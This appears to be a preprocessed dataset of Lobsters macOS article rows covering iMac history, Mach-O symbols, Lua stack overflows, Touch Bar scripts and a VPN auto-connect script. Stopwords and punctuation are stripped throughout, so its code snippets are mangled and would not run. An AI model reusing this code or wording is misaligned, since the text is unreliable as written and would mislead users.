powerpc imac ushered new era computer hardware use usb port apple legacy connector lack removable storage made many consider imac toy gore epler considering amenity shocking part imac offer lack imac floppy drive might forgivable zip drive removablemedia option dramatically new consumer offering scsi port standard serial port adb port apple opted replace familiar connection usb highspeed serial architecture suffered slow adoption wintel platform despite technical advantage see sidebar usb ready prime time currently usb device exist mac read last line currently usb device exist mac usb taken apple would serious trouble new consumer machine thankfully usb ecosystem started materialize time machine went sale august controversial usb port joined modem ethernet jack mezzanine slot shortlived expansion option never really took around front infrared port set headphone jack nod imac potential classroom firewire vga port would appear october internet prefix defined apple product name two decade started job explained keynote stood whole bunch thing internet individual instruct inform inspire word really mattered list first one imac ran mac o mac time apple marketed imac easiest way get internet clever campaign video imac builtin modem ethernet port made slightly easier connect internet first time anything mac day yet imac became synonymous internet bunch imac got sold office school whole lot got put home internet appliance legacy imac big bet apple end multiyear downward spiral finance product people flocked allinone colorful friendly design low price point made hit company sold million machine breathing new life company macintosh giving apple runway build mac o x imac machine lot experience collected made bunch cool stuff donated henry ford museum doubt mind one important personal computer ever made shipping original mhz bondi imac august apple spent next several year refining upgrading product last imac run mac o x tiger clocked mhz discontinued march lifetime imac came finish added support wireless networking video firewire burning cd storage space started gb original model topped gb last model saw incredible rate evolution revised every nine month entire run video today special day one use celebrate special computer even apple history nerd like think appreciate role imac played saving apple read whole lot important little computer check complete imac archive want know time apple history including development mac o x check book subject aqua bondi
313,Lobsters,mac,Apple macOS,Mach-O exploration. Tools - nm,https://yurylapitsky.com/exploring_mac-o_binaries_nm,macho exploration tool nm,macho exploration tool nm exploring macho binary tool pagestuff introduction symbol table trying binary previous post pagestuff ldsymsh file example post difference trylock lock thank reading reference,macho exploration tool nm started exploring macho binary tool pagestuff introduction today plan take look another commandline tool helpful binary analysis already used couple post find specific method declared binary tool nm short description man usually nm display name list symbol table symbol table symbol table represents identifier source code mapped specific address identifier clanguages function global variable defined referenced program objectivec us class instance method basically talking representation binary note interesting fact found reading nm manpage since xcode release version nm nmclassic llvmnm moment default version llvmnm seems used post trying think simple way understand something try see eye nm different option differ formatting additional information however start enough use call without parameter target binary use binary used previous post pagestuff also might want check source code going output sampleclass cxxdestruct sampleclass property sampleclass setproperty u nslog u objcclass nsobject objcclass sampleclass objcivar sampleclassproperty u objcmetaclass nsobject objcmetaclass sampleclass u cfconstantstringclassreference mhexecuteheader u objcemptycache main u objcautoreleasepoolpop u objcautoreleasepoolpush u objcgetproperty u objcmsgsend u objcsetpropertynonatomiccopy u objcstorestrong u dyldstubbinder basically column address type symbol first distinct difference noticed item list address moreover item also u type also see familiar name sampleclass class name property name property nslog function stuff mixed preffixes objc implementation function let examine documentation u referenced defined file undefined item marked u function constant defined outside binary nslog nsobject provided foundation framework function either part arc implementation objectivec runtime etc inserted clang u nslog u objcclass nsobject u objcmetaclass nsobject u cfconstantstringclassreference u objcemptycache u objcautoreleasepoolpop u objcautoreleasepoolpush u objcgetproperty u objcmsgsend u objcsetpropertynonatomiccopy u objcstorestrong u dyldstubbinder global function text object mhexecuteheader main main clearly global function story mhexecuteheader bit complicated found answer ldsymsh file basically say address mach header macho executable file word border line header local function text object sampleclass cxxdestruct sampleclass property sampleclass setproperty see later method locally defined property property defined compiler generated implementation cxxdestruct interesting guest initially part objectivec implementation however currently serf deallocation function objectivec objectivec implementation surprisingly definition took definition man nm symbol section objcclass sampleclass objcivar sampleclassproperty objcmetaclass sampleclass remember pagestuff produced previous post symbol page related data meanwhile tsymbols text page type checked see type define part code linked together internal symbol marked defined right place placed inside binary u symbol require attention linked external resource outside binary part left untouched address address field provides information symbol lie relatively assembler code make sense consider isolation need disassembled code around existing symbol address need use another tool provides disassembly code example lldb one tool check next post example another formatting option found extremely useful output text text nonexternal sampleclass cxxdestruct text text nonexternal sampleclass property text text nonexternal sampleclass setproperty undefined external nslog foundation undefined external objcclass nsobject libobjc data objcdata external objcclass sampleclass data objcivar nonexternal private external objcivar sampleclassproperty undefined external objcmetaclass nsobject libobjc data objcdata external objcmetaclass sampleclass undefined external cfconstantstringclassreference corefoundation text text referenced dynamically external mhexecuteheader undefined external objcemptycache libobjc text text external main undefined external objcautoreleasepoolpop libobjc undefined external objcautoreleasepoolpush libobjc undefined external objcgetproperty libobjc undefined external objcmsgsend libobjc undefined external objcsetpropertynonatomiccopy libobjc undefined external objcstorestrong libobjc undefined external dyldstubbinder libsystem see type replaced segment section also additional column appeared point symbol defined framework name used option lot grep find specific symbol post difference trylock lock thank reading reference
314,Lobsters,mac,Apple macOS,The Woman Who Gave the Macintosh a Smile,https://www.newyorker.com/culture/cultural-comment/the-woman-who-gave-the-macintosh-a-smile,woman gave macintosh smile,everyone honored work grid notebook told interviewer california designing freedom areaware turned reddit twitter interview presented hundredpage booklet problematic,every fifteen minute wrote story moved cursor northward click disk microsoft word toolbar indicates save superstitious move computer automatically save work every ten minute learned use computer era autosave dark age remembering save disk often stood termpaper disaster persistence disk icon age flash drive cloud storage sign power disk mean save susan kare designed version disk part suite icon made macintosh computer could communicate picturespaola antonelli senior curator architecture design museum modern art first physically show kare original icon sketch exhibit everyone mac turned revolutionary pet instead home appliance spark imagination instead mere work thanks susan font icon gave voice personality style even sense humor cherry bomb anyone joked referring icon greeted crash original operating system working apple kare designed icon microsoft facebook pinterest creative director mainstream presence pinterest instagram snapchat emoji gifs sign visual revolutionary online communicate visually piecing together sentence tinyicon languageskare sixtyfour honored work april fellow designer prestigious aiga medal sculptor sometime curator highschool friend andy hertzfeld asked create graphic new computer working california kare brought grid notebook job interview apple computer page sketched pink marker series icon represent command hertzfeld software would execute square represented pixel pointing finger meant paste paintbrush symbolized macpaint scissors said cut kare told origin moment soon started work andy hertzfeld wrote icon editor font editor could design image letterforms using mac paper said loved puzzlelike nature working sixteenbysixteen thirtytwobythirtytwopixel icon grid marriage craft metaphor icon provided kareprintscomwhat kare lacked computer experience made visual knowledge bitmap graphic like mosaic needlepoint pseudodigital art form practiced going apple told interviewer command icon still right left space bar based swedish campground sign meaning interesting feature pulled book historical symbol kare looked crossstitch mosaic hobo sign inspiration got stuck icon like piece paper problem others defy visual like undo one point icon copy machine making copy file user would drag drop file onto copy difficult render copier scale kare also tried cat mirror copycat neither made cut also designed number original mac font including geneva chicago pictureheavy cairo using ninebyseven gridher notebook part permanent collection new york san francisco modernart museum one included recent london design museum exhibit california designing freedom justin mcguirk cocurator exhibition said xerox star initiated metaphor desktop iconbased method interacting computer apple mac popularized macintosh made wait tiny watch designed kare pinterest offer spinning button refresh also designed kare last fall small homedesign brand areaware débuted karedesigned placemats coaster napkin bitmap raindrop wave diagonal bought whole family christmas fun read social medium countless people spent hour microsoft window solitaire using card designed said kare created virtual gift facebook could buy send friend new offering daily based sixtyfourbysixtyfourpixel grid bestseller played crowd heart penguin kiss like digital box chocolate sixtyfourpixel palette would seem like big step kare think detail necessarily make better icon simple image inclusive said look traffic sign reason silhouette kid school crossing sign plaid lunchboxes superhero backpack even though technology limitation said would extraneous detail kare personal style distinctly unfussy bemused last year son colleague pinterest alerted portrait norman seeff taken rolling stone turned reddit subreddit old school cool photo kare lounge horizontally ergonomic chair wearing jean gray sweatshirt one grayandburgundy new balance shoe propped desk regular work seems prenormcore retrospect said lived new balance reebok anklehigh workout shoe colleague brought toy robot souvenir work trip japan see postcard favorite image metropolitan museum toy art sneaker embody rigor humor kare always brought task making icon resonate across decadesa redditor helpfully identified macro bulldozer robodozer twitter daniel mallory ortberg made proposal interview alex soojungkim pang researcher institute future kare brings history american graphic design full circle brought legendary paul rand aiga medal winner designer ibm attention steve job latter founded next needed logo iconic apple rand solution presented hundredpage booklet paid hundred thousand dollar black box poised one corner mimicking distinctive problematic appearance computer letter easier fit perfect cube motherboards get scared design rand quip video presentation taking book kare stand next rand starspangled sweater steve learned lot said unequivocal remember almost pounding table saying fiftyfive year know must great much confidence inexact science asked kare aiga medalist besides rand saw influence list series predigital great whose work known broad appeal infectious warmth sometimes cartoony hand charles ray eames milton glaser new yorker contributor cartoonist saul steinberg work one see legacy personal touch one hope continue digital future deeper level fingerprint reader gave mac smile
318,Lobsters,mac,Apple macOS,Adventures in Lua stack overflows,http://cmsj.net/2018/04/13/lua-stack-adventures.html,adventure lua stack overflow,hammerspoon lua already fixed one code handle tab completion hammerspoon console window twitter hacker news,hammerspoon heavily dependent lua true core application unavoidable interact lua c api lot place never used lua c api designed simple integrate code also place fairly high burden developer integrate properly one way lua remains simple stack based give lua c function make available call lua code conform particular way working function argument supplied user presented stack c code finished work return value must pushed onto stack example static int someusefulfunction luastate l fetch first argument stack int somenumber luatointeger l fetch second argument stack char somestring luatostring l useful work push two return value onto stack return lua know many return value provided luapushstring l result text luapushinteger l return simple enough scenario calling lua creates pseudostack good practice keep stack neat tidy ie remove thing nt need critical apart return value rest stack thrown away pseudostack slot default though pushing lot return argument using stack thing may need use luacheckstack grow larger maximum slot thing get interesting interacting lua stack without crossed boundary example maybe callback function triggered event c program need call lua function user gave earlier might look something like int globalluafunction void somecallback int avalue char astring fetch pointer shared lua state object luastate l somesharedluastateprovider push onto stack lua function previously supplied user lua global registry luarawgeti l luaregistryindex globalluafunction push two argument lua function luapushinteger l avalue luapushstring l astring call lua function telling lua expect two argument luacall l return slightly complex last example still manageable unfortunately practice fairly suboptimal implementation call storing thing luaregistryindex table fine often nicer use multiple table different thing big problem though luacall nt trap error lua code raise exception lua longjmp panic handler abort app writing bit completely get int luacallbacktable int globalluafunctionref void somecallback int avalue char astring fetch pointer shared lua state object luastate l somesharedluastateprovider push onto stack table keep callback reference lua global registry luarawgeti l luaregistryindex luacallbacktable push onto stack callback reference table lua function previously supplied user luarawgeti l globalluafunctionref push two argument lua function luapushinteger l avalue luapushstring l astring protected call lua function telling lua expect two argument luapcall l return ok looking better table neatly storing function reference longer abort lua function throw error however problem leaking least one item onto lua stack possibly two unlike case operating within safe confines pseudostack anything leak stay permanently stack point likely cause stack overflow kicker stack overflow really hard find default nt typically get nice error program simply leak stack slot stack overflow far place leak happening segfault backtraces normal looking lua api call handle stack properly could would actually look like note gone four lua api call first example eight int luacallbacktable int globalluafunctionref void somecallback int avalue char astring fetch pointer shared lua state object luastate l somesharedluastateprovider find luacallbacktable lua registry push onto stack luarawgeti l luaregistryindex luacallbacktable find globalluafunctionref luacallbacktable push onto stack luarawgeti l globalluafunctionref remove luacallbacktable stack leaked example luaremove l push two argument lua function luapushinteger l avalue luapushstring l astring luapcall l false fetch lua error message stack char someerror luatostring l printf error sn someerror remove lua error message stack leaked example luapop l return hammerspoon problem like last month lot crash report surface look like completely valid code executing admit took lot longer realise lua stack overflow rather initial suspicion c heap corruption figured eventually hopefully fixed leak discover problem stack overflow discover leak without manually auditing place make transition answer first question simple defining luauseapicheck compiling lua little extra work verify consistency crucially includes calling abort helpful message stack overflow turned developer march released enabled early april normally recommended api checker enabled production call abort felt important get information crash could nt reproduce within day started getting crash report word stack overflow well error able fix half battle discovered definitely stack leak somewhere discover involve little brute force effort thankfully full manual audit call site instead wrote two macro define luastackguardentry l int luastackguardentryluagettop l define luastackguardexit l assert luastackguardentry luagettop l simple use call luastackguardentry obtained pointer lua state object call luastackguardexit every point function return record size stack luagettop entry point assert exit point assert also call abort something wrong would get crash log crash actual function leak happening entryexit call added call site day released spent evening testing manually verifying every site releasing fixed bug found api checker mean time time writing hour past release far thing looking good strange lua segfault crash report yet one issue found today placed luastackguardexit call c statement seemed unimportant actually caused important object freed already fixed included assuming fixed problem month headscratching week research testing coding turn across call site two stack leak one code handle tab completion hammerspoon console window hsnotify hopefully enjoying stable hammerspoon experience think leaving api checker stack guard macro enabled since make easy findfix sort bug rather get smaller number crash sooner month headscratching discus twitter discus hacker news
319,Lobsters,mac,Apple macOS,Update Office 2016 for Mac by using msupdate,https://docs.microsoft.com/en-us/deployoffice/mac/update-office-for-mac-using-msupdate,update office mac using msupdate,update microsoft application mac using msupdate article applies link example use msupdate application identifier,update microsoft application mac using msupdate minute read article applies office mac office mac office mac microsoft autoupdate mau version later includes msupdate commandline tool used start update process microsoft application produced mac office tool primarily designed administrator precise control update applied download latest version mau link msupdate work sending apple event mau daemon macos mojave later may see privacy prompt running msupdate first time using enterprise management tool jamf pro deploy privacy preference policy control pppc payload preapprove access sample payload downloaded use following step start using tool open terminal application enter cd libraryapplication autoupdateappcontentsmacos run msupdate help following option displayed usage msupdate command args modifier command h help show usage information c config display current autoupdate configuration l list list available update installed microsoft application install download install available update modifier apps app install specific application update v version app update specific version w wait sec number second wait action complete returning current state install command f format format output result specified format p plist property list format example use msupdate display current configuration parameter autoupdate msupdate config display current configuration parameter machinereadable format msupdate config format plist list available update msupdate list download install available update msupdate install download install latest update word excel powerpoint msupdate install apps download install versionspecific update outlook msupdate install apps version application identifier following table list application mac supported autoupdate identifier used specifying apps parameter specifying multiple application commandline separate identifier space application latest word excel powerpoint outlook onenote mau onedrive team skype business remote desktop intune company portal defender atp edge canary edge dev edge beta edge stable identifier used office mac either retail volume licensed version office mac office microsoft plan running macos version sierra later identifier used office mac either retail volume licensed version office mac office microsoft plan running macos version el capitan earlier note update pending mau update must applied application updated identifier casesensitive run interactively commandline use character casing table running management tool jamf pro
320,Lobsters,mac,Apple macOS,Apple Plans to Capture the Future by Getting into the Chip Business,https://medium.com/@JohnBlood/apple-plans-capture-the-future-by-getting-into-the-chip-business-1fe927d7cab4,apple plan capture future getting chip business,apple plan capture future getting chip business marcin nowak unsplash bloomberg apple processor history job tim bennett unsplash current move scare tactic apple part saulo mohana unsplash final thought wintel,apple plan capture future getting chip business back lid open macbook laptop marcin nowak unsplashrecently bloomberg broke news apple planning drop intel start manufacturing using chip according report end goal move unify apple mobile desktop platform interesting idea might work postpc worldapple processor historyin term desktop computer apple currently fourth processor platform earliest apple computer apple apple ii powered mo technology chip macintosh came scene needed computing power drive new graphical interface led adoption motorola processorsby early motorola chip falling behind performance apple needed something new quest find new processor apple started work two project first partnership ibm apple motorola goal making ibm powerpc processor architecture new standard industry part deal group worked creation portable multimedia engine named scriptx group also worked porting development version apple nextgeneration operating system pink powerpc part partnership pink renamed taligent apple later lost interest taligent became sole property ibm apple continued new attempt operating system replace aging system codenamed copeland copeland canceled apple purchased steve job next used nextstep foundation mac o x digress time ibm apple motorola partnership small skunkworks project apple codenamed star trek goal star trek port mac o intel architecture good amount progress made project abruptly canceled leader main promoter left apple microsoftin steve job announced future apple computer would use intel chip according job main reason change ibm slow speed chip development apple wanted take advantage intel le powerhungry chip especially laptopsphoto tim bennett unsplashthe current movebased quick history obvious apple want master destiny bloomberg article reason given move away intel previous move slow progressover last couple year seems though rate processor development slowed considerably long ago pc processor rating however decade since introduction processor seen number much higher seems impassible barrier maybe apple think knowhow accomplish thisthe question leave intel world going going switch arm arm power smartphones embedded system quite powerful enough desktop use going jump yet unknown standard answer question know fact matter know apple planning move away intel going remains secret known people cupertinois scare tactic apple part since real information planned move question immediately come mind could apple made announcement intimidate intel according bloomberg article apple account intel revenue maybe apple think getting discount chip buy maybe apple want intel add certain feature intel refuse however would drop revenue enough alarm intel first saw bloomberg article wondered april fool prank even checked publication date came april april fool joke lateright little go way decide good move apple announcement cause intel stock drop blood spilled already homescreen screen iphone person hand saulo mohana unsplashfinal thoughtsas stated little information hard form opinion topic like challengefor year apple odd man company gave unstoppable juggernaut windowsintel platform conscious choice apple part actively campaigned show platform superior wintel move intel year later seen surrender gave apple access new generation software writer userswith fall desktop laptop computing rise mobile cloud computing apple see opportunity unify computing experience across device creation single codebase run single tightly integrated chip architecture apple see opportunity recreate windowsintel juggernaut image tame beast willit interesting thought experiment problem project requires two thing time money certainly money time microsoft google working project capture future computing microsoft working get window running arm hardware google currently working combine android chromeos also started work new mobile operating system named fuchsiacloser home people saying apple need new product line fast want stay relevant many improvement make iphone apple watch found much tractiontime tell let hope apple something cool unforgettable
321,Lobsters,mac,Apple macOS,The Graphing Calculator Story (2004),http://www.nucalc.com/Story/,graphing calculator story,milo framemaker,pacific tech graphing calculator long history began work school became milo later became part framemaker last twenty year many people contributed graphing calculator apple bundled original powerpc computer originated unique circumstance used contractor apple working secret project unfortunately computer building never saw light day project plagued politics ego engineer requested technical oversight manager hired psychologist instead august project canceled year work evaporated contract ended unemployed frustrated wasted effort decided uncancel small part project paid job wanted finish electronic badge still opened apple door kept showing many sympathizer apple engineer thought cool whenever gave demo colleague said wish school working apple project change microprocessor computer ibm powerpc especially supportive thought software would show speed new machine none able hire however worked unofficially classic skunkworks fashion knew nothing powerpc idea modify software run one august night dinner two guy showed announce would camp office modification done three u spent next six hour editing fifty thousand line code work delicate surgery requiring arcane knowledge macos powerpc software would taken week one u working alone trekked office powerpc prototype looked took deep breath launched application monitor burst flame calmly carried outside avoid setting smoke detector plugged another monitor tried software nt caused fire monitor chosen moment malfunction software ran fifty time faster run old microprocessor played agreed nt suck high praise apple lingo impressive demo would take month hard work turn product asked friend greg robbins help contract another division apple ended told manager would start reporting nt ask let keep office badge turn told people reporting since left manager loop meeting could extremely productive worked twelve hour day seven day week greg unlimited energy perfectionist attention detail usually stayed behind closed door programming day spent much time talking engineer since asked help personal favor keep pace thanks uncurtained eastfacing window bedroom woke dawn usually arrived ten minute greg would think working hour feel obliged work late stay par turn felt obliged stay late feedback loop created everincreasing spiral productivity people around apple campus saw u time assumed belonged asked doingwhen someone ask never lied relied power corporate apathy conversation usually went like q work q mean contractor actually q paying one q live live simply q incredulously point give demo explain project canceled staying finish anyway since neither mortgage family could afford live saving engineer apple many canceled project completely understood motivation apple time strong tradition skunkworks project engineer continued work canceled project hope producing demo would inspire management revive occasion succeeded one project appropriately codenamed spectre canceled restarted fewer five time engineer worked hour skunkworks addition working full time assigned project greg nonemployees daytime responsibility merely extending tradition next level september apple facility tried move people officially empty office noticed u facility woman assumed merely changed project yet moved new group something happened time asked group worked since would group responsibility find space told truth amused called security cancel badge told u uncertain term leave premise saved layoff began month twenty percent apple fifteen thousand worker lost job greg safe nt book first place nt officially exist afterwards plenty empty office found two started sneaking building every day waiting front real employee arrive casually tailgating door lot people knew u one asked question since wore old badge decoy making great progress could nt get done alone creating sophisticated software requires team effort one person use smoke mirror make demo dazzle audience shipping million customer expose flaw leave everyone looking bad cliche business first percent work easy second percent wear last percent attention detail make good product making software simultaneously easy learn easy use friendly useful powerful take people incredible combination skill talent artistry working together intensity patience greg could core engineering far cry creating finished product among thing needed professional quality assurance qa difficult timeconsuming testing would show u design flaw implementation bug could nt see work nowhere two qa guy never met approached u heard venture rumor mill become kind underground cause célèbre day job qaing system software mindnumbingly boring volunteered help u saying let tell bos ok one guy phd mathematics previously written mathematical software godsend started right away next needed help writing software draw threedimensional image software produced friend expertise area took weekend startup company write software two day would taken month skunkworks project beginning look real help professional well others graphic design documentation programming mathematics user interface secret programming intelligence though course help hard work experience though help secret programming smart friend one last pressing question could get thing included system software new machine shipped thought might fail terrified far possibility criminal prosecution trespass sweat greg put clandestine aid friend acquaintance stranger shamelessly imposed donation time expertise hardware soft drink junk food would wasted sanity saved kindness stranger one morning visitor appeared office engineer responsible making powerpc system disk master explained thing way apple hardware company factory far away building apple computer one final step assembly line copy system software golden master hard disk onto computer hard disk create golden master fedex manufacturing plant real pragmatic sense decide software ship told gave software day production run began could appear golden master disk anyone realized thirty thousand unit software disk would boxed warehouse retrospect may joking nt know allowed u move forward confidence plausible way ship apple became ideal work environment every engineer knew willing help u got resource would never available u payroll example time two hundred powerpc chip existed world apple used hardware design engineer dozen coveted powerpc machine even available system software people working operating system two engineer would come office midnight practically slip machine door one said officially machine nt exist nt get nt know make sure nt leave building october thought almost finished engineer helping u demonstrate software manager dozen people packed office nt expect support felt obliged make goodfaith effort go official channel gave twentyminute demonstration eliciting oohs ahhs afterward asked report group nt seen earlier explained sneaking building project nt exist laughed realized serious told nt repeat story director powerpc software academic leave dartmouth director powerpc marketing son math teacher seeing value putting educational software every macintosh every school promptly adopted u thing got really weird qa manager assigned people test product nt tell people already working localization group assigned people translate twenty language human interface group ran formal usability study center whirlwind activity nevertheless greg still sneak building people charge powerpc project upon company future depended could nt get u badge without purchase order could nt get purchase order without signed contract could nt get contract without approval legal legal heard truth escorted building greg lurking outside one day trying act casual another engineer accosted said sick tired guy loitering front building every day later phoned appropriate bureaucrat behalf listened side conversation twenty minute po paying contract contractor employee intention hiring yes must building access shipping code box nt po number po paying finally wore said use standard form apply badge cross contractor write vendor asked po number use magic word dollar contract got badge next day orange vendor badge kind people working cafeteria watering plant fixing photocopy machine official recognition made life exciting suddenly even people became enthusiastically involved formal usability testing student teacher began discovered far done long proud elegance simplicity design wanted program ship every macintosh designed user even know little computer hate math wanted make mathematics easy enjoyable playing game classroom time spent frustrated computer time taken away teaching sitting behind twoway mirror watching firsttime user struggle software reminded programmer least qualified people design software novice humbled five day greg went back painstakingly added feedback software standing next user explaining recognition made life interesting way since could longer remain well kept secret demo outside developer one person called apple claiming infringed patent causing fire drill could show prior art another company maker simply demanded product pulled apple politely declined one week evading security next week apple rising defense november full crunch mode working sixteen hour day seven day week feeling pressure home stretch blur wake grab bagel eat driving work till drop sleep repeat story movie would see clock hand spinning calendar page blowing away wind finished january graphing calculator part macintosh ever since teacher around world use animated blackboard illustrate abstract concept visually shipped twenty million machine never officially existed greg something ludicrous sneaking eightbilliondollar corporation volunteer work apple financial trouble joked volunteering nonprofit organization reality motivation complex partly powerpc awesome machine wanted show could done spinal tap idiom said ok one go eleven partly thinking storytelling value partly macho computer guy thing never shipped million copy software mostly greg felt creating quality educational software public service help kid learn math public school poor buy software effective way deliver install factory beyond lie another set question psychological political bitterness project canceled subversively coopting resource multinational corporation end naive manipulated system working incredibly hard benefit loose cannon driven arrogance ego devoted furthering cause education view event experiment subverting power structure none traditional power others inherent structure corporation bureaucracy neither budget headcount answered one one anything asked dozen people collaborated spontaneously motivated loyalty friendship love craftsmanship hacker creating something sheer joy making work six month grueling unpaid labor greg could nt explain parent done nt use computer periodical read new york time project winding asked greg wanted photo time parent would know gave possible response yeah right made bet dinner le mouton noir fine french restaurant saratoga honest expected lose made phone call greg nt bet march front page time business section contained article alliance among apple ibm motorola picturing greg front yard view santa cruz mountain someone knew apple public relation livid asked wanted send someone interview said engineer allowed talk press hard enforce kind thing people ca nt fired positive press apple though parent pleased wanted release window version part window sadly microsoft effective building security postscript event described made everything retroactively legitimate licensing software apple distribution pacific tech started year later continued develop graphing calculator new free version apple bundled mac o mac o commercial release
322,Lobsters,mac,Apple macOS,Making the Touch Bar finally useful,http://vas3k.com/blog/touchbar/,making touch bar finally useful,touch bar still remains useless shit hope apple fix reddit bettertouchtool upd upd wttrin json helper location helper high sierra medium key enabler beardedspice first second json helper location helper upd,macbook pro touch bar main work tool year use every single day day long code process photo write blog post course back thought touch bar vast potential become engaging helpful believed developer might support application hoping use year passed application updated pro user pro laptop euro price tag declare touch bar still remains useless shit hope apple fix thing got even worse apple reinvented playpause button high sierra control everything browser ad notification sound everything except music wat machine macbook pro great touch bar touch bar inflamed appendix dumb shit siri apple implemented additional row fkeys replacement everyone would forget couple day reason simple see laptop time well hand hardly see touch bar twice two hour first time leaving get coffee second time back cup hot flat white prouser ever thought copying text using touch bar something like apple guideline restrict unique feature even need crap give unique capability take away fkeys doomed macbooks treated u well laptop feel like cheap plastic toy nailed floor macos still best combining usability popular operating system flexibility unix else ubuntu use photoshop wine watch plasma crash like good old day thanks whole year pushed use touch bar paid pro opinion fuck guideline apple touch bar always predictable nt want remember button configuration every app want useful informative give additional screen like early fan render saying extra screen give childhood flashback sleepless night coding conky configs archlinux display desktop important thing weather cpuusage ipaddress fullscreen clock course pride envy every nerdy schoolboy lucky average healthy teenager show nightmare ew creep let shit stay went grew look cool cyberpunky literally one evening never use afterwards thing must useful beautiful grownup started track everyday habit search reddit idea proper app touch bar customization found bettertouchtool still buggy userhostile drain battery cost reasonable price recommend read every single guide bettertouchtool setup came following conclusion based whether work cool crap name track playing deadly necessary feature always wondering spotify discover brings bitcoin price idea widget popular worthless distraction volume button button rock always faster tap slide brightness slider requires lot space used week watching futurama night finder one click want instant access finder anywhere default touch bar ca nt weird ram usage useless modern o always nearly natural listening music open finder day code deploy docker etc work instrument set flawlessly touch bar ca nt make work better however lot process always running background music keep playing new idea popup would good write touch bar perfect place everything nt need time pain as look thing needed eg eyedropper tool take hex color code screen two week experiment writing widget trying observing something show obviously something change time today already see started use touch bar remember every button eat jony ive story every single button several time touch bar stopped working esc hidden idea hide esc must always tied rightful place thanks bettertouchtool button next esc return default touch bar case need something standard functionality nt used yet though imagine want drag picture browser upload click finder instead opening new window screen carry away somewhere another finder window opened fucking impossible fix standard macos tool come applescript first force finder open new window tell switch home folder open top way found despite applescript fun feel like playing text rpg coding tell application finder make new finder window set target front window path home folder string activate end tell upd found nasty bug holding finder button launch million finder window gon na really bad time found always use two apps want access anywhere nt want exit fullscreen ide write something note two simple app button like dock add first added bunch unnecessary one two survived nt want replace dock improve usability standard touch bar never support useful feature display name track playing instead apple provides huge useless timeline slider nt know playing know moment time handy fuck slider button need track name cute pictogram easily google applescript configuration work spotify itunes even active script click name track playing work next priceless especially nickelback song interferes aigenerated playlist whether way get back previous track nope prev button used rarely need waste space need reason open app application spotify running tell application spotify player state playing return get artist current track get name current track else return end end tell end application itunes running tell application itunes player state playing return get artist current track get name current track else return end end tell end return would cool display name youtube video touch bar right script look open safari tab find one start youtubecomwatch display tab title touch bar clicking get exact tab neat little problem though bettertouchtool run script timer way make simple browser plugin displaying text script running second praying wo nt overload cpu upd cpu fine battery nt turned waiting btt update probably write tool external scripting support application safari running tell application safari repeat tab window tell url start http wwwyoutubecomwatch return name text end end tell end repeat end tell end return practice timemanagement life cycle requires simple todolist remindersapp would nice see top reminder touch bar turned well eg whole week trying forget extend insurance immediately became eyesore touch bar even tell dumb siri hey remind buy milk appears touch bar nailed two useless thing replaced useful one nice clicking reminder open full reminder list check completed add nay problem reminder long spotify grabbed whole space since scroll area touch bar tell application reminder set activereminders name reminder list reminder whose completed false activereminders return first item activereminders else return end end tell personal guilty pleasure see weather outside imagine freaking cold sitting fireplace covered bee plaid glass hot wine seems like sunny warm day mean adventure time long time ago even little utility tracking current weather tray probably first app bought decided make one touch bar main issue thing hardcoded location always forget change traveling nicely done wttrin location traced ip json helper location helper installed write youself couple line applescript need buy app appstore profit need full report clicking brings straight local weather website even add emojis display cloud cover take look github repo end article reader already made tell application location helper set clocationcoords get location coordinate tell application json helper set weather fetch json http lat item clocationcoords lon item clocationcoords unitsmetric appidyourowmappid set temp temp main weather string return temp end tell end tell vital rule office life block laptop leaving need explain fan hot corner always used ctrl shift power shortcut pity nt work new macbooks touch id good news add button action standard touch bar decided steal feature make coffee break button lock laptop switch screen extremely useful adorable pictogram everyone notice asks get one hate slider touch bar changing button first thing tap blindly guess even stress level significantly dropped stopped trying put slider desired position adjusting hot water shower never gon na get without burning look close button part touch bar guideline state place wider though seems like perfect placement favourite size starting macos high sierra playpause button globally control system sound problem iphone mac control every ad popup priority spotify tap button nt understand nt stop music thanks apple convinient seems like apple extremely proud amazing innovative idea nt even think fixing random guy internet solved high sierra medium key enabler utility work neatly also take look beardedspice want even control applescript playpause button control itunes spotify depending active one running automatically launch spotify need think application itunes running tell application itunes playpause else tell application spotify playpause end one script change playpause pictogram application spotify running tell application spotify player state playing return pause end tell end application itunes running tell application itunes player state playing return pause end tell end return play yeah previously mentioned linux nerd set clock everywhere though two important unobvious us touch bar first always occasionally tap key placed backspacedelete button suffering area action must placed nt want activate every minute probably apple put siri analyst satisfied bet u merely spot clock second fullscreen apps day pycharm opened fullscreen help efficiently use screen get distracted critical bug fix asap message thing ca nt see time fullscreen mode could easily miss important meeting short useful full config look like nt forget uncheck macos control strip setting fully replace default touch bar complete preset promised import bettertouchtool click manage presets import make weather work also need json helper location helper try easy need evening sort probably compile something great apple hire u cool upd lot cool guy wanted share presets created githubrepo feel free add much time passed since article written btt author added many cool feature use instead handmade widget bad news presets mostly working beginning tried update new version btt many incompatible change gave use article guide able create something even cooler proud impact touchbar customization btt thank guy
323,Lobsters,mac,Apple macOS,Connecting to a VPN automatically when not at home,https://jpadilla.com/2018/04/04/connecting-to-a-vpn-automatically-when-not-at-home/,connecting vpn automatically home,viscosity connectionname whitelistssids pathtonetworkchangescript,home wifi rarely connect vpn always make habit except forget hoping vpn client would feature automatically connect based list network quick research guess maybe wrong ended nifty solution currently using viscosity vpn client work similarly client allow scripting first part place bash script somewhere make executable probably want update connectionname name vpn connection want use whitelistssids ssid wifi network trust go ahead try executing connected different wifi network binbash ssid networksetup getairportnetwork cut c connectionname pia u east whitelistssids millennium falcon us enterprise untrustedtrue ssid whitelistssids ssid ssid untrustedfalse fi done untrusted true osascript e tell application viscosity connect connectionname fi next want make happen automatically launch agent execute bash script every time librarypreferencessystemconfigurationcomappleairportpreferencesplist changed create file librarylaunchagentscomjpadillanetworkchangeplist sure update pathtonetworkchangescript actual path script previous part xml version encoding doctype plist public apple computerdtd plist http plist version dict key label key string networkchange string key lowpriorityio key true key programarguments key array string pathtonetworkchangescript string array key watchpaths key array string librarypreferencessystemconfigurationcomappleairportpreferencesplist string array key runatload key true dict plist run following load service without login launchctl load librarylaunchagentscomjpadillanetworkchangeplist try connecting different wifi network watch vpn automatically connect
